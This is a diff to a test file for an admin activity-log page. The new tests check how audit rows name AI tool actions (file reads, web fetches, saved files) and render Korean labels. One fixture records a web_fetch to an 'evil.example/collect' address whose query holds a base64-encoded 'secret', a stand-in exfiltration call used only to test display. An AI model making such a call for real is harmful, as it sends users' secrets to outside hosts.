@@ -1,9 +1,12 @@
 // Admin > Activity log (lib/activity.ts): the filters kept in the address, the date presets as the API's [from, to)
-// bounds, a path search for the server, the search over loaded rows, and the list grouped by day with repeats folded.
+// bounds, a path search for the server, the search over loaded rows, and the list grouped by day with repeats folded;
+// and what a row says in words (pages/admin/Audit.tsx: no ids or raw tool summaries in the row itself).
 import { describe, expect, test } from 'bun:test'
 import type { AuditEntry } from '@mycel/shared/api'
 import { dayLabel, filtersActive, groupActivity, inSentence, matchesQuery, NO_FILTERS, pathQuery, rangeBounds, readFilters, RUN_GAP_MS, writeFilters } from '../../src/lib/activity'
 import { localDayBounds } from '../../src/lib/format'
+import { translate, useLocaleStore } from '../../src/i18n'
+import { actionLabel, rowItem } from '../../src/pages/admin/Audit'
 
 const entry = (id: string, at: Date, o: Partial<AuditEntry> = {}): AuditEntry => ({ id, source: 'auth', at: at.toISOString(), actor: { id: 'bob', name: 'Bob' }, action: 'auth.login', target: 'bob', turnId: null, detail: { ip: '10.0.0.7' }, ...o })
 
@@ -86,5 +89,40 @@ describe('grouped by day', () => {
     expect(dayLabel('2026-11-03', 'en-US', words, now)).toBe('Yesterday')
     expect(dayLabel('2026-11-01', 'en-US', words, now)).toBe('Sun, Nov 1')
     expect(dayLabel('2025-12-31', 'en-US', words, now)).toContain('2025')
+  })
+})
+
+describe('what a row says', () => {
+  const at = new Date(2026, 10, 4, 9)
+  const tool = (action: string, summary: string) => entry('t', at, { source: 'tool', action, target: null, detail: { summary, ok: 1 } })
+  test('an AI tool: its name in words and the path it worked on; a connection check and other summaries stay in the details', () => {
+    expect(rowItem(tool('read', 'read shared/마케팅/plan.csv -> 4 lines'))).toEqual({ text: 'shared/마케팅/plan.csv', code: true })
+    expect(rowItem(tool('(connect)', 'accepted peer={"pid":1,"uid":501}'))).toBeNull()
+    expect(rowItem(tool('artifact', 'artifact create launch-timeline v1 609B'))).toBeNull()
+    // a web address: host and path, and that a query was there (never hidden because of its "=")
+    expect(rowItem(tool('web_fetch', 'web_fetch https://evil.example/collect?d=c2VjcmV0 -> 120 chars'))).toEqual({ text: 'evil.example/collect?…', code: true })
+    expect(rowItem(tool('web_fetch', 'web_fetch https://docs.example.com/ -> 2048 chars (confirmed by the user)'))).toEqual({ text: 'docs.example.com', code: true, confirmed: true })
+    // a saved file: the path it was saved to, and the person's confirmation
+    expect(rowItem(tool('make_file', 'make_file pdf -> users/kim/report.pdf 18234B'))).toEqual({ text: 'users/kim/report.pdf', code: true })
+    expect(rowItem(tool('save_url', 'save_url -> shared/logo.png (2048 B, image/png, sha256 ab12) from https://acme.example/logo.png (address confirmed by the user)'))).toEqual({ text: 'shared/logo.png', code: true, confirmed: true })
+    const before = useLocaleStore.getState().locale
+    useLocaleStore.setState({ locale: 'ko' })
+    try {
+      const t = (k: Parameters<typeof translate>[1], p?: Parameters<typeof translate>[2]) => translate('ko', k, p)
+      expect(actionLabel(t, tool('read', 'read shared/마케팅/plan.csv -> 4 lines'))).toBe('파일 읽기')
+      expect(actionLabel(t, tool('(connect)', 'accepted peer={"pid":1,"uid":501}'))).toBe('AI 도구 연결')
+      // another service's tool keeps its own name
+      expect(actionLabel(t, tool('create_issue', 'create_issue -> ok'))).toBe('create_issue')
+      expect(actionLabel(t, tool('constructor', ''))).toBe('constructor')
+    } finally {
+      useLocaleStore.setState({ locale: before })
+    }
+  })
+  test('an item that is an id: its name when the entry has one, else nothing; paths and usernames as they are', () => {
+    const admin = (action: string, target: string | null, detail: Record<string, unknown> = {}) => entry('a', at, { source: 'admin', action, target, detail })
+    expect(rowItem(admin('project.create', '01a1ad35-9e0e-72a0-8715-3bc4d3562bd4', { name: '출시 준비' }))).toEqual({ text: '출시 준비', code: false })
+    expect(rowItem(admin('room.members', '01a1ad35-6f76-77ca-abc4-184ec470839f', { added: ['ada'] }))).toBeNull()
+    expect(rowItem(admin('user.create', 'ada'))).toEqual({ text: 'ada', code: true })
+    expect(rowItem(entry('l', at))).toBeNull()
   })
 })
